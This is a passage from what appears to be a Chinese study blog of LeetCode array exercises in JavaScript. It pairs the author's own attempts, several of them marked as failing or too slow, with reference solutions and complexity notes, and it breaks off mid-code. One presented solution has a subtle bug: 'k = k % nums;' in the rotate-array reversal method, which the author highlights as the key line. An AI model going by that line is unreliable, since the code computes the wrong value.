id="LeetCode11——盛最多水的容器（☆☆）"><a href="#LeetCode11——盛最多水的容器（☆☆）" class="headerlink" title="LeetCode11——盛最多水的容器（☆☆）"></a>LeetCode11——盛最多水的容器（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/container-with-most-water/">跳转地址</a></p><h3 id="自己的代码-14"><a href="#自己的代码-14" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxArea = <span class="function"><span class="keyword">function</span>(<span class="params">height</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> max = <span class="number">0</span>, len = height.length, sum;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; len; j++)&#123;</span><br><span class="line">      sum = <span class="built_in">Math</span>.min(height[i], height[j]) * (j - i);</span><br><span class="line">      max = <span class="built_in">Math</span>.max(max, sum);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> max;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>暴破，但是过不了因为时间限制了。（看到题目后只有这一种想法了，不知道如何优化时间复杂度）</p><h3 id="思路-amp-题解-9"><a href="#思路-amp-题解-9" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>双指针：左右边界 i，j 向中间收敛。<strong>（两根柱子，肯定是双指针）</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxArea = <span class="function"><span class="keyword">function</span>(<span class="params">height</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> max = <span class="number">0</span>, len = height.length;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, j = len - <span class="number">1</span>; i &lt; j;)&#123;</span><br><span class="line">    <span class="comment">// 每个循环找到两个柱子中最短的, 挪动最短的柱子(这样面积才有可能变大).</span></span><br><span class="line">    <span class="keyword">let</span> minHeight = height[i] &lt; height[j] ? height[i++] : height[j--];</span><br><span class="line">    <span class="keyword">let</span> area = minHeight * (j - i + <span class="number">1</span>);</span><br><span class="line">    max = <span class="built_in">Math</span>.max(max, area);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> max;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样也能遍历每一种情况，且只是单循环。（自己对双指针是真不了解）</p><p>时间复杂度：O(N)，双指针总计最多遍历整个数组一次。</p><h2 id="LeetCode189——旋转数组（☆☆）"><a href="#LeetCode189——旋转数组（☆☆）" class="headerlink" title="LeetCode189——旋转数组（☆☆）"></a>LeetCode189——旋转数组（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/rotate-array/">跳转地址</a></p><h3 id="自己的代码-15"><a href="#自己的代码-15" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span> (<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> len = nums.length;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line">    nums.unshift(nums[len-<span class="number">1</span>])</span><br><span class="line">    nums.pop(len);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nums</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>只能想到pop加unshift这一种方法了，还过不了（超出时间限制）。题目要求最好用三种方法实现=-=我太菜了。</p><h3 id="思路1-amp-题解-5"><a href="#思路1-amp-题解-5" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p><strong>使用额外的数组：</strong>原来题目要求的空间复杂度O(1)是思考题，害，只能怪自己读题不仔细了。这方法简单（不贴了）。</p><p>时间复杂度： O(n)，其中 n 为数组的长度。</p><h3 id="思路2-amp-题解-5"><a href="#思路2-amp-题解-5" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>数组翻转：太巧妙了！</p><ol><li>首先对整个数组实行翻转，这样子原数组中需要翻转的子数组，就会跑到数组最前面。</li><li>这时候，从 k 处分隔数组，左右两数组，各自进行翻转即可。</li></ol><p><img src="https://i.loli.net/2021/06/19/7lAjQBuiYGXET6d.jpg" alt="Snipaste_2021-06-19_16-25-58.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> reverse = <span class="function"><span class="keyword">function</span> (<span class="params">nums, start, end</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">    [nums[start++],nums[end--]]=[nums[end],nums[start]]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span> (<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">  k = k % nums;</span><br><span class="line">  reverse(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">  reverse(nums, <span class="number">0</span>, k - <span class="number">1</span>);</span><br><span class="line">  reverse(nums, k, nums.length - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> nums</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>k = k % nums;</code>也很关键，容易遗忘。</p><p>时间复杂度：O(n)，其中 nn 为数组的长度。每个元素被翻转两次，一共 n 个元素，因此总时间复杂度为 O(2n)=O(n)。</p><h3 id="思路3-amp-题解-3"><a href="#思路3-amp-题解-3" class="headerlink" title="思路3&amp;题解"></a>思路3&amp;题解</h3><p>对于数组nums,向右移动k位移，等价于将原数组第<code>nums.length-k</code>位置到末尾移动到前面。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rotate = <span class="function"><span class="keyword">function</span> (<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">    k = k % nums.length;</span><br><span class="line">    nums.unshift(...nums.splice(nums.length - k));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>原来真的可以一两行代码实现。做的时候也有想到如何把后面一堆统一移动到前面。 <strong>splice</strong> 这个方法一定要掌握啊！</p><h2 id="LeetCode217——存在重复元素（☆）"><a href="#LeetCode217——存在重复元素（☆）" class="headerlink" title="LeetCode217——存在重复元素（☆）"></a>LeetCode217——存在重复元素（☆）</h2><p><a href="https://leetcode-cn.com/problems/contains-duplicate/">跳转地址</a></p><h3 id="自己的代码-16"><a href="#自己的代码-16" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> containsDuplicate = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, len = nums.length; i &lt; len; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums.indexOf(nums[i])!==i) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>做出来问题不大，但是时间复杂度竟然达到了 O(n^2)！以后写代码一定要注意啊。（indexOf按顺序遍历列表，时间复杂度为O(n)）</p><h3 id="思路1-amp-题解-6"><a href="#思路1-amp-题解-6" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>先将数组排序，然后再遍历判断。（为什么做题的时候想不到呢）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> containsDuplicate = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    nums.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">    <span class="keyword">const</span> n = nums.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] === nums[i + <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(NlogN)，其中 N 为数组的长度。需要对数组进行排序。（时间复杂度太高了！）</p><h3 id="思路2-amp-题解-6"><a href="#思路2-amp-题解-6" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>哈希表:</p><ol><li>创建一个哈希表，然后从左往右遍历数组。</li><li>检测哈希表中是否已存在当前字符，若存在，直接返回结果，若不存在，将当前字符加入哈希表，供后续判断使用即可。</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> containsDuplicate = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">of</span> nums)&#123;</span><br><span class="line">        <span class="keyword">if</span>(map.has(i))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            map.set(i, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(N)，其中 N 为数组的长度。</p><h2 id="LeetCode136——只出现一次的数字（☆）"><a href="#LeetCode136——只出现一次的数字（☆）" class="headerlink" title="LeetCode136——只出现一次的数字（☆）"></a>LeetCode136——只出现一次的数字（☆）</h2><p><a href="https://leetcode-cn.com/problems/single-number/">跳转地址</a></p><h3 id="自己的代码-17"><a href="#自己的代码-17" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> singleNumber = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">10000</span>).fill(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> nums)&#123;</span><br><span class="line">    arr[i] +=<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> i</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>感觉思维永远是小学生思维，什么时候才能写出像标答一样的代码啊。</p><h3 id="思路1-amp-题解-7"><a href="#思路1-amp-题解-7" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>排序后比较，老生常谈了。</p><h3 id="思路2-amp-题解-7"><a href="#思路2-amp-题解-7" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>利用map Hash映射</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">    nums.forEach(<span class="function"><span class="params">item</span> =&gt;</span>&#123;</span><br><span class="line">        map.set(item, map.has(item) ? map.get(item) + <span class="number">1</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> [key, val] <span class="keyword">of</span> map.entries())&#123;</span><br><span class="line">        <span class="keyword">if</span>(val === <span class="number">1</span>) <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样空间复杂度为O(n)，时间复杂度 O(n)</p><h3 id="思路3-amp-题解-4"><a href="#思路3-amp-题解-4" class="headerlink" title="思路3&amp;题解"></a>思路3&amp;题解</h3><p>异或运算：</p><ul><li>一个数和 0 做 XOR 运算等于本身：a⊕0 = a</li><li>一个数和其本身做 XOR 运算等于 0：a⊕a = 0</li><li>XOR 运算满足交换律和结合律：a⊕b⊕a = (a⊕a)⊕b = 0⊕b = b</li><li>将所有数字按照顺序做异或运算，最后剩下的结果即为唯一的数字</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> singleNumber = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> num <span class="keyword">of</span> nums) &#123;</span><br><span class="line">        ans ^= num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">return</span> nums.reduce(<span class="function">(<span class="params">pre,cur</span>) =&gt;</span> pre ^ cur);</span><br></pre></td></tr></table></figure><p>时间复杂度：O(n)，空间复杂度：O(1)</p><h2 id="LeetCode350——两个数组的交集-II（☆）"><a href="#LeetCode350——两个数组的交集-II（☆）" class="headerlink" title="LeetCode350——两个数组的交集 II（☆）"></a>LeetCode350——两个数组的交集 II（☆）</h2><p><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays-ii/">跳转地址</a></p><h3 id="自己的代码-18"><a href="#自己的代码-18" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> intersect = <span class="function"><span class="keyword">function</span>(<span class="params">nums1, nums2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arr1 = [],arr2=[],arr=[];</span><br><span class="line">  arr1 = nums1.length &lt; nums2.length ? [...nums1] : [...nums2];</span><br><span class="line">  arr2 = nums1.length &lt; nums2.length ? [...nums2] : [...nums1];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr1.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (arr2.indexOf(arr1[i]) !== -<span class="number">1</span>) &#123;</span><br><span class="line">      arr.push(arr1[i])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr  <span class="comment">// [1,2] [1,1]=&gt;[1,1]</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>发现到现在遇到 <strong>判断数组中的某个值是否存在</strong> 还是只会 indexOf ，而这个api感觉不太有用，比如这里没法判断重复 [1,2] [1,1]=&gt;[1]。</p><p>突然发现，自己的第3、4行代码好傻。<code> if (nums1.length &lt; nums2.length) [nums1, nums2] = [nums2, nums1];</code> 这不香吗？</p><h3 id="思路-amp-题解-10"><a href="#思路-amp-题解-10" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>双指针：先行将数组排序，方便查找，然后正式流程如下：</p><ol><li>创建一个指针 i 指向 nums1 数组首位，指针 j 指向 nums2 数组首位。</li><li>创建一个临时栈，用于存放结果集。</li><li>开始比较指针 i 和指针 j 的值大小，若两个值不等，则数字小的指针，往右移一位。</li><li>若指针 i 和指针 j 的值相等，则将交集压入栈。</li><li>若 nums 或 nums2 有一方遍历结束，代表另一方的剩余值，都是唯一存在，且不会与之产生交集的。</li></ol><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> intersect = <span class="function"><span class="keyword">function</span> (<span class="params">nums1, nums2</span>) </span>&#123;</span><br><span class="line">    nums1.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">    nums2.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br><span class="line">    <span class="keyword">let</span> l = <span class="number">0</span>, r = <span class="number">0</span>, ans = [];</span><br><span class="line">    <span class="keyword">while</span> (l &lt; nums1.length &amp;&amp; r &lt; nums2.length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums1[l] === nums2[r]) &#123;</span><br><span class="line">            ans.push(nums1[l]);</span><br><span class="line">            l++;</span><br><span class="line">            r++;</span><br><span class="line">        &#125; <span class="keyword">else</span> nums1[l] &lt; nums2[r] ? l++ : r++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我为什么这么不愿意先排序数组啊。明明一行代码久能搞定的事。</p><blockquote><p>有一个疑问：<code>nums1.sort((a, b) =&gt; a - b);</code>和<code>nums1.sort()</code>有什么区别呢？为什么改成后面的就过不了？ A：sort 默认对字符串排序</p></blockquote><h3 id="思路2-amp-题解-8"><a href="#思路2-amp-题解-8" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>看完网上的，发现自己之前的代码也能实现。O(n^2)暴破：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr=[];</span><br><span class="line">  <span class="keyword">if</span> (nums1.length &lt; nums2.length) [nums1, nums2] = [nums2, nums1]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums1.length; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> n = nums2.indexOf(nums1[i]);</span><br><span class="line">    <span class="keyword">if</span> ( n!== -<span class="number">1</span>) &#123;</span><br><span class="line">      arr.push(...nums2.splice(n,<span class="number">1</span>))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">return</span> arr </span><br></pre></td></tr></table></figure><p>之前败在arr的长度问题，其实用splice对nums2进行缩减就完全没问题了。注意需要用…拓展运算符将得到的数组变成字符。</p><h3 id="思路3-amp-题解-5"><a href="#思路3-amp-题解-5" class="headerlink" title="思路3&amp;题解"></a>思路3&amp;题解</h3><p>哈希表：(还没仔细看)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> intersect = <span class="function">(<span class="params">nums1, nums2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> res = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> num1 <span class="keyword">of</span> nums1) &#123; <span class="comment">// 记录nums1各个数字的出现次数</span></span><br><span class="line">    <span class="keyword">if</span> (map[num1]) &#123;</span><br><span class="line">      map[num1]++;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;         </span><br><span class="line">      map[num1] = <span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> num2 <span class="keyword">of</span> nums2) &#123; <span class="comment">// 遍历nums2，看看有没有数字在nums1出现过</span></span><br><span class="line">    <span class="keyword">const</span> val = map[num2];</span><br><span class="line">    <span class="keyword">if</span> (val &gt; <span class="number">0</span>) &#123;            <span class="comment">// 有出现过</span></span><br><span class="line">      res.push(num2);         <span class="comment">// 推入res数组</span></span><br><span class="line">      map[num2]--;            <span class="comment">// 匹配掉一个，就减一个</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode66——加一（☆）"><a href="#LeetCode66——加一（☆）" class="headerlink" title="LeetCode66——加一（☆）"></a>LeetCode66——加一（☆）</h2><p><a href="https://leetcode-cn.com/problems/plus-one/">跳转地址</a></p><h3 id="自己的代码-19"><a href="#自己的代码-19" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> plusOne = <span class="function"><span class="keyword">function</span> (<span class="params">digits</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="built_in">parseInt</span>(digits.join(<span class="string">&quot;&quot;</span>))+<span class="number">1</span>+<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    digits[i] = <span class="built_in">parseInt</span>(s[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> digits</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未 AC。没想到看起来这么简单的一道题目，被卡死了。。看到题目第一眼就是直接对数组最后一位+1，但是没考虑到9。然后又想判断是否为9，对前一位+1，但存在个位数，没有index为-1的情况。</p><p>然后换了种方法，数组先变字符串再变数字+1，再变字符串，拆分为数组，最后得到数字数组，但是parseInt有最大限制，用Float也不行。</p><h3 id="思路-amp-题解-11"><a href="#思路-amp-题解-11" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>总结一下可能会遇到的问题：</p><ol><li>当前位是否需要进位？</li><li>数字长度是否会改变？</li></ol><p><del>（为啥这么快就能抓住题目精髓啊）</del></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> plusOne = <span class="function"><span class="keyword">function</span>(<span class="params">digits</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = digits.length - <span class="number">1</span>; i&gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(digits[i] &lt; <span class="number">9</span>)&#123;</span><br><span class="line">            digits[i]++</span><br><span class="line">            <span class="keyword">return</span> digits</span><br><span class="line">        &#125;</span><br><span class="line">        digits[i] = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    digits.unshift(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> digits</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//下面的方法其实也一样</span></span><br><span class="line"><span class="keyword">var</span> plusOne = <span class="function"><span class="keyword">function</span>(<span class="params">digits</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = digits.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        digits[i]++</span><br><span class="line">        digits[i] = digits[i] % <span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> (digits[i]) <span class="keyword">return</span> digits</span><br><span class="line">    &#125;</span><br><span class="line">    digits.unshift(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> digits</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode36——有效的数独（☆☆）（to-redo）"><a href="#LeetCode36——有效的数独（☆☆）（to-redo）" class="headerlink" title="LeetCode36——有效的数独（☆☆）（to redo）"></a>LeetCode36——有效的数独（☆☆）（to redo）</h2><p><a href="https://leetcode-cn.com/problems/valid-sudoku/">跳转地址</a></p><h3 id="自己的代码-20"><a href="#自己的代码-20" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>完全没法做这道题目，这是啥啊？感觉符合规则1、2就已经好麻烦了，不知道怎么下手。</p><h3 id="思路1-amp-题解-8"><a href="#思路1-amp-题解-8" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>利用map的has来判断。先把横竖验了，再验块状。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidSudoku = <span class="function"><span class="keyword">function</span>(<span class="params">board</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> mapRow = <span class="keyword">new</span> <span class="built_in">Map</span>(), mapColumn = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)&#123;</span><br><span class="line">    mapRow.clear();</span><br><span class="line">    mapColumn.clear();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span>; j++)&#123;</span><br><span class="line">      <span class="keyword">if</span> (mapRow.has(board[i][j])) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (mapColumn.has(board[j][i])) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (board[i][j] !== <span class="string">&quot;.&quot;</span>) &#123; mapRow.set(board[i][j], j) &#125;</span><br><span class="line">      <span class="keyword">if</span> (board[j][i] !== <span class="string">&quot;.&quot;</span>) &#123; mapColumn.set(board[j][i], i) &#125; <span class="comment">// set后面的i、j只是值，甚至可以常量</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">let</span> m = <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (m &lt; <span class="number">9</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (n &lt; <span class="number">9</span>) &#123;</span><br><span class="line">      map.clear();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = n; i &lt; n + <span class="number">3</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = m; j &lt; m + <span class="number">3</span>; j++)&#123;</span><br><span class="line">          <span class="keyword">if</span> (map.has(board[i][j])) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">if</span>(board[i][j]!==<span class="string">&quot;.&quot;</span>)&#123; map.set(board[i][j],i) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      n+=<span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">    n=<span class="number">0</span></span><br><span class="line">    m+=<span class="number">3</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(n^2)</p><h3 id="思路2-amp-题解-9"><a href="#思路2-amp-题解-9" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>用 Set 更方便些。（注意题目只要求对已有数字进行验证！）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidSudoku = <span class="function"><span class="keyword">function</span>(<span class="params">board</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> row = <span class="keyword">new</span> <span class="built_in">Set</span>(),</span><br><span class="line">        col = <span class="keyword">new</span> <span class="built_in">Set</span>(),</span><br><span class="line">        box = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">let</span> _row = board[i][j];</span><br><span class="line">      <span class="keyword">let</span> _col = board[j][i];</span><br><span class="line">      <span class="comment">// 使用 i、j 对3*3的框进行迭代</span></span><br><span class="line">      <span class="keyword">let</span> _box = board[<span class="number">3</span>*<span class="built_in">Math</span>.floor(i/<span class="number">3</span>)+<span class="built_in">Math</span>.floor(j/<span class="number">3</span>)][<span class="number">3</span>*(i%<span class="number">3</span>)+(j%<span class="number">3</span>)]</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (_row != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (row.has(_row)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        row.add(_row);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (_col != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (col.has(_col)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        col.add(_col);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (_box != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (box.has(_box)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        box.add(_box);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode22——括号生成（☆☆）"><a href="#LeetCode22——括号生成（☆☆）" class="headerlink" title="LeetCode22——括号生成（☆☆）"></a>LeetCode22——括号生成（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/generate-parentheses/">跳转地址</a></p><h3 id="自己的代码-21"><a href="#自己的代码-21" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> generateParenthesis = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = [];</span><br><span class="line">  <span class="keyword">let</span> generate = <span class="function"><span class="keyword">function</span> (<span class="params">left, right, n, str</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 1.终止条件</span></span><br><span class="line">    <span class="keyword">if</span> (left === n &amp;&amp; right === n) &#123;</span><br><span class="line">      res.push(str);</span><br><span class="line">    